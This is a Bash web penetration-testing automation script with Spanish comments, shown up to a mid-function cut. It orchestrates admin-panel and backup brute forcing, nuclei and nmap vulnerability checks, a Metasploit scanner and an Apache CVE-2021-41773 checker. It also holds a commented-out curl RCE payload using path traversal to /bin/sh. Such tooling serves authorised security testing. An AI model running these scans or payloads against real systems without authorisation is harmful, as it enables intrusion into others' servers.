#!/bin/bash
#FIX  clone site cuando se revisa servicios/web.txt valor $DOMINIO parece incorrecto
OKBLUE='\033[94m'
THREADS="30"
OKRED='\033[91m'
OKGREEN='\033[92m'
OKORANGE='\033[93m'
RESET='\e[0m'
LC_TIME=C


# usamos un bucle while para recorrer todos los argumentos

while (( "$#" )); do
  case "$1" in
    --url)
      URL=$2
      shift 2
      ;;
	--target)
      TARGETS=$2
      shift 2
      ;;
	--speed) #1->1 hilo /2-> 5 hilos /3-> 10 hilos
      SPEED=$2
      shift 2
      ;;
    --mode)
      MODE=$2
      shift 2
      ;;
    --proxychains)
      PROXYCHAINS=$2
      shift 2
      ;;
    --hosting)
      HOSTING=$2
      shift 2
      ;;
    --internet)
      INTERNET=$2 #s/n
      shift 2
      ;;
    --ipList)
      IP_LIST_FILE=$2
      shift 2
      ;;
    --domain)
      DOMINIO=$2
      shift 2
      ;;
	--extratest)
      EXTRATEST=$2 # oscp = aspx/php file bruteforce + web crawling + sqli + xss
      shift 2
      ;;
	--specific)
      ESPECIFIC=$2 # 1 = esperar guardar sitio del navegador usar blackwidow/sqlmap/dalfox
      shift 2
      ;;
    --verbose)
      VERBOSE=$2
      shift 2
      ;;
	--force)
      FORCE=$2 # si tiene el valor "internet" (se esta escaneando redes de internet)
      shift 2
      ;;
    --) # end argument parsing
      shift
      break
      ;;
    -*|--*=) # unsupported flags
      echo "Error: Flag no soportada $1" >&2
      exit 1
      ;;
    *) # preserve positional arguments
      PARAMS="$PARAMS $1"
      shift
      ;;
  esac
done

# set positional arguments in their proper place
eval set -- "$PARAMS"

MIN_RAM=900;
MAX_SCRIPTS=4
hilos_web=10
webScaneado=0 # para saber si escaneo algun sitio web
path_web='/'
webservers_defaultTitles=("IIS Windows Server" "Apache2 Ubuntu Default Page: It works" "Apache default page" "Apache2 Debian Default Page: It works")
source /usr/share/lanscanner/api_keys.conf


customPanel=$(cat << 'EOL'
initium
microapp
inicia
Registro
Entrar
Cuentas
kiosko
login
Quasar App
Web Management
intranet
InicioSesion
S.R.L.
SRL
Sign In
PLATAFORMA
administrador
Iniciar sesion
Sistema
Usuarios
Ingrese
Ingreso de Usuario
phpmyadmin
Pedidos
log in
EOL
)

defaultAdminURL=$(cat << 'EOL'
wordpress
joomla
drupal
302 Found
Always200-OK
swfobject
BladeSystem
Zabbix
botpress
Plesk
FortiMail
ZK Web Server
StreamHub
QNAP
SolarWinds
404 not found
broadband device
Check Point
cisco
Chamilo
Metabase
Cloudflare
controlpanel
Diagnostic Interface
cpanel
erpnext
Fortinet
Dahua
CrushFTP
MailCleaner
GitLab
Liferay
GoAhead-Webs
Grafana
hikvision
Huawei
Juniper
keycloak
Mini web server
networkMonitoring
Nextcloud
NTLM
Office
oviyam
openresty
Open Source Routing Machine
oracle
ownCloud
Payara
pfsense
printer
processmaker
Roundcube
Router
RouterOS
SoftEther
SonicWALL
FortiGate
airOS
Strapi
Slim
Sophos
Taiga
TOTVS
tp-link
TrueConf Server Guest Page
Tyco
User Portal
Viridian
webmail
whm
xxxxxx
Zentyal
OLT Web Management Interface
Zimbra
Outlook
owa
EOL
)

TOKEN_WPSCAN=${API_WPSCAN[$RANDOM % ${#API_WPSCAN[@]}]}
echo "Version: 1.0 13082024"
echo "TOKEN_WPSCAN: $TOKEN_WPSCAN"

if [[  ${SPEED} == "1" ]]; then
	hilos_web=1
	MAX_SCRIPT_INSTANCES=10
fi
if [[  ${SPEED} == "2" ]]; then
	hilos_web=3
	MAX_SCRIPT_INSTANCES=30
fi
if [[  ${SPEED} == "3" ]]; then
	hilos_web=1
	MAX_SCRIPT_INSTANCES=250
fi

echo "hilos_web $hilos_web"

if [[ -z $TARGETS && -z $URL ]] ; then

cat << "EOF"
WebTester.sh v2
Options:
--mode: hacking/total
--proxychains: s/n
--hosting: s/n
--specific: 1 = esperar guardar sitio del navegador usar blackwidow/sqlmap/dalfox
--extratest: oscp
	*aspx/php file bruteforce
	*web crawling
	*sqli
	*xss
--internet s/n
	* slowloris
	* waf detection
	* clone site
	* Metadata


Para escanear una sola aplicacion:
webTester.sh --url https://ypfb.com.bo --mode $MODE --hosting $HOSTING --internet $INTERNET --verbose $VERBOSE --specific 1

Para escanear varias aplicaciones web
webTester.sh --target servicios/web.txt --mode hacking --proxychains s --hosting n --internet n --ipList vivos.txt --domain www.ypfb.com.bo --verbose 1
EOF
exit
fi

if [ ! -d "servicios" ]; then #si no existe la carpeta servicios es un nuevo escaneo
	echo "creando carpetas"
	mkdir .enumeracion 2>/dev/null
	mkdir .enumeracion2 2>/dev/null
	mkdir .banners 2>/dev/null
	mkdir .banners2 2>/dev/null
	mkdir .vulnerabilidades	2>/dev/null
	mkdir .vulnerabilidades2 2>/dev/null
	mkdir reportes
	mkdir -p webClone/ 2>/dev/null
	mkdir -p logs/enumeracion
	mkdir -p logs/vulnerabilidades
    mkdir responder
	mkdir servicios
	cp /usr/share/lanscanner/.resultados.db .
else
	echo "no crear carpetas"
fi

# si escaneamos una sola app https://prueba.com.bo | http://192.168.1.2:8080 | https://prueba.com.bo/login
if [ ! -z $URL ] ; then #
	#cat $TARGETS | cut -d ":" -f1 | sort | uniq > hosts-lives.txt
	http_proto_http=$(echo ${URL} | cut -d'/' -f1 | tr -d ':')
	echo "Protocolo: $http_proto_http"

	# Extraer host
	host=$(echo ${URL} | cut -d'/' -f3 | cut -d':' -f1)
	echo "Host: $host"

	# Extraer puerto
	port=$(echo ${URL} | cut -d'/' -f3 | cut -d':' -f2)
	# Verificar si la URL contiene un puerto
	if [[ $port =~ ^[0-9]+$ ]] ; then
		echo "Puerto: $port"
	else
		if [[  ${http_proto_http} == *"https"* ]]; then
			port="443"
		else
			port="80"
		fi
		# En este caso, puerto puede contener parte de la ruta si la URL no tiene un puerto definido
	fi

	# Extraer ruta
	path_web="/"$(echo ${URL} | cut -d'/' -f4-)"/"
	# Reemplazar '//' con '/'
	path_web=${path_web//\/\//\/}
	echo "path_web extraido $path_web"

	if [[ "$URL" == *"localhost"* ]] || [[ "$URL" == *"127.0.0.1"* ]]; then
		echo "La URL contiene 'localhost'. Saliendo del programa."
		exit 1
	fi

	echo "" > servicios/web-app-tmp.txt #clear last scan

	# --url http://192.168.1.2:8080
	if [[ $host =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
		ip=$host
		echo "$ip:$port:$http_proto_http" >> servicios/web-app-tmp.txt
	else # --url https://prueba.com.bo
		DOMINIO=$host
		echo "DOMINIO $DOMINIO"
		echo "$DOMINIO:$port:$http_proto_http" >> servicios/web-app-tmp.txt
	fi
	sed -i ':a;N;$!ba;s/\n//g' servicios/web-app-tmp.txt

	TARGETS=servicios/web-app-tmp.txt
	cat $TARGETS | cut -d ":" -f 1 > servicios/hosts.txt
	IP_LIST_FILE="servicios/hosts.txt"
fi
echo "path_web ($path_web)"
path_web_sin_slash=$(echo "$path_web" | sed 's/\///g')
if [[ -n "$path_web_sin_slash" ]]; then
  # Append a hyphen to path_web_sin_slash
  path_web_sin_slash="${path_web_sin_slash}-"
fi
echo "path_web_sin_slash ($path_web_sin_slash)"
############### FUNCIONES ########################

function insert_data () {
	find .vulnerabilidades -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
	find .enumeracion -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
	insert-data.py 2>/dev/null
	mv .enumeracion/* .enumeracion2 2>/dev/null
	mv .vulnerabilidades/* .vulnerabilidades2 2>/dev/null
	mv .banners/* .banners2 2>/dev/null
	}


function checkRAM (){
	while true; do
		free_ram=`free -m | grep -i mem | awk '{print $7}'`
		script_instancias=$((`ps aux | egrep 'webData|passWeb|crackmap' | wc -l` - 1))
		python_instancias=$((`ps aux | grep get_ssl_cert | wc -l` - 1))
		script_instancias=$((script_instancias + python_instancias))

		if [[ $free_ram -lt $MIN_RAM  || $script_instancias -gt $MAX_SCRIPT_INSTANCES  ]];then
			echo "Poca RAM $free_ram MB ($script_instancias scripts activos)"
			sleep 3
		else
			break

		fi
	done
}

function insert_data_admin () {
	insert-data-admin.py 2>/dev/null

	#URL usadas para identificar si es panel administrativo propio o generico
	# cat servicios/admin-web-url.txt >> servicios/admin-web-url-inserted.txt 2>/dev/null
	# rm servicios/admin-web-url.txt 2>/dev/null

	#paneles administrativos propios + CMS
	cat servicios/admin-web-custom.txt >> servicios_archived/admin-web-custom-inserted.txt 2>/dev/null
	# Paneles de administracion genericos (sophos, ))
	cat servicios/admin-web-generic.txt >> servicios_archived/admin-web-generic-inserted.txt 2>/dev/null
	}

function formato_ip {
    local ip=$1
    local stat=1

    # Verificar si la entrada es una dirección IP utilizando una expresión regular
    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        IFS='.' read -ra ip_parts <<< "$ip"

        # Verificar cada octeto
        for i in "${ip_parts[@]}"; do
            if [[ $i -le 0 || $i -ge 255 ]]; then
                stat=1
                break
            else
                stat=0
            fi
        done
    fi

    return $stat
}


function waitFinish (){
	################# Comprobar que no haya scripts ejecutandose ########
	while true; do
		script_instancias=$((`ps aux | egrep 'webData|get_ssl_cert|buster|httpmethods|msfconsole|nmap|droopescan|CVE-2019-19781.sh|nuclei|owa.pl|curl|firepower.pl|wampServer|medusa|JoomlaJCKeditor.py|joomla-|testssl.sh|wpscan|joomscan' | egrep -v 'discover.sh|lanscanner.sh|autohack.sh|heka.sh|grep -E|grep --color' | wc -l` ))
		echo -e "\tscript_instancias ($script_instancias)"
		if [[ $script_instancias -gt 0  ]];then
			echo -e "\t[-] Aun hay scripts en segundo plano activos"
			sleep 10
		else
			break
		fi
	done
}


#No permite que haya muchos script ejecutandose simultaneamente
function waitWeb (){
	######## wait to finish ########
	sleep $1
	  while true; do
	    free_ram=`free -m | grep -i mem | awk '{print $7}'`
		script_instancias=$((`ps aux | egrep "web-buster|webData|nmap|nuclei" | egrep -v 'discover.sh|lanscanner.sh|autohack.sh|heka.sh|grep -E' | wc -l` - 1))
		#if [ "$VERBOSE" == '1' ]; then  echo "RAM=$free_ram"; date; fi
		if [[ $free_ram -lt $MIN_RAM || $script_instancias -gt $MAX_SCRIPT_INSTANCES  ]];then
			echo -e "\t[i] Todavia hay muchos escaneos de web-buster/webData activos ($script_instancias) RAM=$free_ram"
			sleep 5
		else
			break
		fi
	  done
	  ##############################
}
function enumeracionDefecto() {
    proto_http=$1
    host=$2
    port=$3
	msg_error_404=$4 #cadena en comillas simples
  	
	if [ ! -z "$msg_error_404" ];then
		param_msg_error="-error404 $msg_error_404" 
	else
		param_msg_error=""
	fi

    echo -e "\t[+] Default enumeration ($proto_http : $host : $port [$param_msg_error])"
    waitWeb 0.3
    egrep -qiv "$defaultAdminURL" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
    greprc=$?

    if [[ $greprc -eq 0 ]]; then
        #1: si no existe log
        if [[ ! -e "logs/vulnerabilidades/${host}_${port}_${path_web_sin_slash}apacheNuclei.txt" ]]; then
            waitWeb 0.3
            echo -e "\t\t[+] Revisando paneles administrativos ($host - default)"
            command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module admin -threads $hilos_web -redirects 0 -show404 $param_msg_error"
            echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webadmin.txt
            eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webadmin.txt &

            waitWeb 0.3
            echo -e "\t\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($host - default)"
            checkerWeb.py --tipo phpinfo --url $proto_http://$host:$port/ > logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"phpinfo.txt &
            command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module information -threads $hilos_web -redirects 0 -show404 $param_msg_error"
            echo $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"divulgacionInformacion.txt
            eval $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"divulgacionInformacion.txt &

            waitWeb 0.3
            echo -e "\t\t[+] Revisando archivos peligrosos ($host - default)"
            command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module archivosPeligrosos -threads $hilos_web -redirects 0 -show404 $param_msg_error"
            echo $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"archivosPeligrosos.txt
            eval $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"archivosPeligrosos.txt &
        fi

        if [[ "$MODE" == "total" || ! -z "$URL" ]]; then
            egrep -i "drupal|wordpress|joomla|moodle" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt | egrep -qiv "$defaultAdminURL"
            greprc=$?

            if [[ $greprc -eq 1 ]]; then
                waitWeb 0.3
                echo -e "\t\t[+] Revisando folders - completo ($host - default)"
                command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module folders -threads $hilos_web -redirects 0 -show404 $param_msg_error"
                echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt
                eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt &
            fi

            waitWeb 0.3
            echo -e "\t\t[+] Revisando backups de archivos genericos ($host - default)"
            command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module folders-short -threads $hilos_web -redirects 0 -show404 $param_msg_error"
            echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt
            eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt &

            waitWeb 0.3
            echo -e "\t\t[+] Revisando archivos por defecto ($host - default)"
            command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module default -threads $hilos_web -redirects 0 -show404 $param_msg_error"
            echo $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"archivosDefecto.txt
            eval $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"archivosDefecto.txt &
        fi
    fi
}

function enumeracionSharePoint() {
    proto_http=$1
    host=$2
    port=$3
	msg_error_404=$4 #cadena en comillas simples
  	
	if [ ! -z "$msg_error_404" ];then
		param_msg_error="-error404 $msg_error_404" 
	else
		param_msg_error=""
	fi

    #1: si no existe log
    if [[ ! -e "logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"SharePoint.txt" ]]; then
        echo -e "\t[+] Enumerar Sharepoint ($proto_http : $host : $port)"
                waitWeb 0.3
        echo -e "\t\t[+] Revisando archivos comunes de sharepoint ($host - SharePoint)"
        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module sharepoint -threads $hilos_web -redirects 0 -show404 -error404 'something went wrong'"
        echo $command > logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"SharePoint.txt
        eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"SharePoint.txt &

		# if [[ ${host} != *"nube"* && ${host} != *"webmail"* && ${host} != *"cpanel"* && ${host} != *"autoconfig"* && ${host} != *"ftp"* && ${host} != *"whm"* && ${host} != *"webdisk"* && ${host} != *"autodiscover"* ]]; then
        #     echo -e "\t\t[+] Revisando directorios comunes ($host - SharePoint)"
        #     waitWeb 0.3
        #     command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module folders -threads $hilos_web -redirects 0 -show404 -error404 'something went wrong'"
        #     echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt
        #     eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt &
        # fi

    fi
}

function enumeracionIIS() {
    proto_http=$1
    host=$2
    port=$3
	msg_error_404=$4 #cadena en comillas simples
  	
	if [ ! -z "$msg_error_404" ];then
		param_msg_error="-error404 $msg_error_404" 
	else
		param_msg_error=""
	fi

    #1: si no existe log
    if [[ ! -e "logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webadmin.txt" ]]; then
        echo -e "\t[+] Enumerar IIS ($proto_http : $host : $port [$param_msg_error])"
        egrep -iq "IIS/6.0|IIS/5.1" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
        IIS6=$?
        if [[ $IIS6 -eq 0 ]]; then
            echo -e "\t\t[+] Detectado IIS/6.0|IIS/5.1 - Revisando vulnerabilidad web-dav ($host - IIS)"
            echo "$proxychains  nmap -Pn -n -sT -p $port --script=http-iis-webdav-vuln $host" >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"IISwebdavVulnerable.txt 2>/dev/null
            $proxychains nmap -Pn -n -sT -p $port --script=http-iis-webdav-vuln $host >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"IISwebdavVulnerable.txt 2>/dev/null &
        fi

        echo -e "\t\t[+] Revisando paneles administrativos ($host - IIS)"
        command="web-buster -target $host -port $port  -proto $proto_http -path $path_web -module admin -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webadmin.txt
        eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webadmin.txt &

		echo -e "\t\t[+] Revisando backups ($host - IIS)"
        command="web-buster -target $host -port $port  -proto $proto_http -path $path_web -module backups -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"backupweb.txt
        eval $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"backupweb.txt &


        waitWeb 0.3
        echo -e "\t\t[+] Revisando archivos peligrosos ($host - IIS)"
        command="web-buster -target $host -port $port  -proto $proto_http -path $path_web -module archivosPeligrosos -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"archivosPeligrosos.txt
        eval $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"archivosPeligrosos.txt &

        waitWeb 0.3
        echo -e "\t\t[+] Revisando archivos genericos ($host - IIS)"
        command="web-buster -target $host -port $port  -proto $proto_http -path $path_web -module folders-short -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt
        eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt &

        waitWeb 0.3
        echo -e "\t\t[+] Revisando archivos comunes de servidor ($host - IIS)"
        command="web-buster -target $host -port $port  -proto $proto_http -path $path_web -module webserver -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webserver.txt
        eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webserver.txt &

        waitWeb 0.3
        echo -e "\t\t[+] Revisando openWebservice ($host - IIS)"
        command="web-buster -target $host -port $port  -proto $proto_http -path $path_web -module webservices -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"openWebservice.txt
        eval $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"openWebservice.txt &
    fi

    if [[ ${host} != *"nube"* && ${host} != *"webmail"* && ${host} != *"cpanel"* && ${host} != *"autoconfig"* && ${host} != *"ftp"* && ${host} != *"whm"* && ${host} != *"webdisk"* && ${host} != *"autodiscover"* ]]; then
        egrep -i "drupal|wordpress|joomla|moodle" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt | egrep -qiv "$defaultAdminURL"
        greprc=$?
        if [[ $greprc -eq 1 ]]; then

            if [[ "$MODE" == "total" || ! -z "$URL" ]]; then

                waitWeb 0.3
                echo -e "\t\t[+] Revisando directorios comunes - completo ($host - IIS)"
                waitWeb 0.3
                command="web-buster -target $host -port $port  -proto $proto_http -path $path_web -module folders -threads $hilos_web -redirects 0 -show404 $param_msg_error"
                echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt
                eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt &

                waitWeb 0.3
                echo -e "\t\t[+] Revisando archivos por defecto ($host - IIS)"
                command="web-buster -target $host -port $port  -proto $proto_http -path $path_web -module default -threads $hilos_web -redirects 0 -show404 $param_msg_error"
                echo $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"archivosDefecto.txt
                eval $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"archivosDefecto.txt &

                echo -e "\t\t[+] Revisando vulnerabilidad HTTP.sys ($host - IIS)"
                echo "$proxychains  nmap -p $port --script http-vuln-cve2015-1635.nse $host" >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"HTTPsys.txt
                $proxychains nmap -n -Pn -p $port --script http-vuln-cve2015-1635.nse $host >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"HTTPsys.txt &
                
                
                waitWeb 0.3
				echo -e "\t\t[+] Revisando la existencia de backdoors ($host - IIS)"
				command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module backdoorIIS -threads $hilos_web -redirects 0 -show404 $param_msg_error"
				echo $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"webshell.txt
				eval $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"webshell.txt &

				waitWeb 0.3
				echo -e "\t\t[+] Revisando backups de archivos de configuración ($host - IIS)"
				command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module configIIS -threads $hilos_web -redirects 0 -show404 $param_msg_error"
				echo $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"configIIS.txt
				eval $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"configIIS.txt &

				waitWeb 0.3
				echo -e "\t\t[+] certsrv ($host - IIS)"
				command="curl --max-time 10 -s -k -o /dev/null -w '%{http_code}' 'http://$host/certsrv/certfnsh.asp'"
				echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"certsrv.txt
				eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"certsrv.txt &

				#iis_shortname_scanner
				$proxychains msfconsole -x "use auxiliary/scanner/http/iis_shortname_scanner;set RHOSTS $host;exploit;exit" > logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"shortname.txt 2>/dev/null &

			fi #total

			if [ "$EXTRATEST" == "oscp" ]; then
				waitWeb 0.3
				echo -e "\t\t[+] Revisando archivos aspx ($host - IIS)"
				command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module aspx -threads $hilos_web -redirects 0 -show404 $param_msg_error"
				echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"aspx-files.txt
				eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"aspx-files.txt &
			fi #oscp
		fi	#NO CMS
	fi	#hosting domains
}

function enumeracionApi() {
    proto_http=$1
    host=$2
    port=$3
	msg_error_404=$4
  	waitWeb 0.3
	
	if [ ! -z "$msg_error_404" ];then
		# Eliminar el último carácter de msg_error_404
		msg_error_404_modified="${msg_error_404%?}"
		param_msg_error="-error404 $msg_error_404_modified|not found'" #parametro para web-buster
	else
		param_msg_error="-error404 'not found'"
	fi

	echo -e "\t\t[+] Revisando archivos API ($host - nginx [$param_msg_error])"
	command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module api -threads $hilos_web -redirects 0 -show404 $param_msg_error"
	echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"api.txt
	eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"api.txt &
}


function enumeracionAdminCMS() {
    proto_http=$1
    host=$2
    port=$3
	msg_error_404=$4 #cadena en comillas simples

	waitWeb 0.3
	echo -e "\t\t[+] Revisando paneles administrativos CMS ($host - Apache/nginx)"
	command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module adminCMS -threads $hilos_web -redirects 0 -show404 $param_msg_error"
	echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webadmin.txt
	eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webadmin.txt &
}


function enumeracionApache() {
    proto_http=$1
    host=$2
    port=$3
	msg_error_404=$4 #cadena en comillas simples
  	
	if [ ! -z "$msg_error_404" ];then
		param_msg_error="-error404 $msg_error_404" 
	else
		param_msg_error=""
	fi


    #1: si no existe log
    if [[ ! -e "logs/vulnerabilidades/${host}_${port}_${path_web_sin_slash}apacheNuclei.txt" ]]; then
        echo -e "\t\t[+] Enumerar Apache ($proto_http : $host : $port [$param_msg_error])"
        waitWeb 0.3
        echo -e "\t\t[+] Nuclei apache $proto_http $host:$port"
        command="nuclei -u '$proto_http://$host:$port' -id /root/.local/nuclei-templates/cves/apache.txt -no-color -include-rr -debug"
        echo $command > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"apacheNuclei.txt
        eval $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"apacheNuclei.txt 2>&1 &

        waitWeb 0.3
        echo -e "\t\t[+] Revisando paneles administrativos ($host - Apache/nginx)"
        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module admin -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webadmin.txt
        eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webadmin.txt &


		waitWeb 0.3
		echo -e "\t\t[+] Revisando backups ($host - Apache/nginx)"
        command="web-buster -target $host -port $port  -proto $proto_http -path $path_web -module backups -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"backupweb.txt
        eval $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"backupweb.txt &

        waitWeb 0.3
        echo -e "\t\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($host - Apache/nginx)"
        checkerWeb.py --tipo phpinfo --url $proto_http://$host:$port/ > logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"phpinfo.txt &
        
		command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module information -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"divulgacionInformacion.txt
        eval $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"divulgacionInformacion.txt &

        waitWeb 0.3
        echo -e "\t\t[+] Revisando archivos peligrosos ($host - Apache/nginx)"
        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module archivosPeligrosos -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"archivosPeligrosos.txt
        eval $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"archivosPeligrosos.txt &

        waitWeb 0.3
        echo -e "\t\t[+] Revisando archivos genericos ($host - Apache/nginx)"
        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module folders-short -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt
        eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt &

        waitWeb 0.3
        echo -e "\t\t[+] Revisando archivos comunes de servidor ($host - Apache/nginx)"
        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module webserver -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webserver.txt
        eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webserver.txt &

        # CVE~2021~4177
        echo -e "\t\t[+] Revisando apache traversal)"
        command="$proxychains apache-cve-2021-41773.py --target $host --port $port"
        echo $command > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"apacheTraversal.txt
        eval $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"apacheTraversal.txt 2>&1 &

        # CVE~2021~41773
        #echo -e "\t\t[+] Revisando CVE~2021~41773 (RCE)"
        #command="$proxychains curl -k --max-time 10 $proto_http://$host:$port/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id'"
        #echo $command > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CVE~2021~41773.txt
        #eval $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CVE~2021~41773.txt 2>&1 &
    fi

	if [[ ${host} != *"nube"* && ${host} != *"webmail"* && ${host} != *"cpanel"* && ${host} != *"autoconfig"* && ${host} != *"ftp"* && ${host} != *"whm"* && ${host} != *"webdisk"* && ${host} != *"autodiscover"* ]]; then
		egrep -i "drupal|wordpress|joomla|moodle" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt | egrep -qiv "$defaultAdminURL"
		greprc=$?
		if [[ $greprc -eq 1 ]]; then

			if [[ "$MODE" == "total" || ! -z "$URL" ]]; then

				waitWeb 0.3
				echo -e "\t\t[+] Revisando directorios comunes - completo  ($host - Apache/nginx)"
				command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module folders -threads $hilos_web -redirects 0 -show404 $param_msg_error"
				echo $command > logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt
				eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt &
				sleep 1

				waitWeb 0.3
				echo -e "\t\t[+] Revisando archivos por defecto ($host - Apache/nginx)"
